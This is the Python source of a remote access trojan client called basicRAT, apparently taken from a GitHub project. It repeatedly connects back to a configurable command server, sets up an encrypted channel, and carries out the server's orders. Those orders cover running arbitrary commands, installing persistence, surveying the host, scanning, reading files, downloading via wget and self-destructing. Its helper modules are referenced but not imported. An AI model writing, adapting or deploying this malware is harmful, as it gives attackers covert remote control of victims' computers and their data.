#!/usr/bin/env python

#
# basicRAT client
# https://github.com/xifeng2009/basicRAT3
#

import socket, sys, time, datetime

# from core import *

# Change these to suit your needs
HOST = 'localhost'
PORT = 1337

# Seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# Parameters
NOW = lambda : datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

# Determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print('[!] {} This platform is not supported.'.format(NOW()))
    sys.exit(1)
    
# LOOP
def client_loop(conn, dhkey):

    while True:
        results = ''
        # Wait to receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)
        # Seperate data into command and action
        cmd, _, action = data.partition(' ')
        
        if cmd == 'kill':
            conn.close(); return 1
        elif cmd == 'selfdestruct':
            conn.close() # TODO: 添加一个询问密码机制
            toolkit.selfdestruct(PLAT)
        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break
        elif cmd == 'persistence':
            results = persistence.run(PLAT)
        elif cmd == 'scan':
            results = scan.singel_host(action)
        elif cmd == 'survey':
            results = survey.run(PLAT)
        elif cmd == 'cat':
            results = toolkit.cat(action)
        elif cmd == 'execute':
            results = toolkit.execute(action)
        elif cmd == 'ls':
            results = toolkit.ls(action)
        elif cmd == 'pwd':
            results = toolkit.pwd()
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
        elif cmd == 'wget':
            results = toolkit.wget(action)
        
        results = results.rstrip() + '\n{} completed.'.format(cmd.upper()) # TODO
        conn.send(crypto.encrypt(results, dhkey))
        
def main():

    exit_status = True
    
    while True:
        conn = socket.socket()
        try:
            # Attempt to Connect to basicRAT server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue
        dhkey = crypto.diffiehellman(conn)
        '''
        This try/except statement makes the client very resilient,
        But it's horrible for debugging.
        It will keep the client alive if the server is torn down unexpectedly,
        Or if the client freaks out.
        '''
        try:
            exit_status = client_loop(conn, dhkey)
        except: pass
        
        if exit_status:
            sys.exit(0)

if __name__ == '__main__':
    main()



































        
            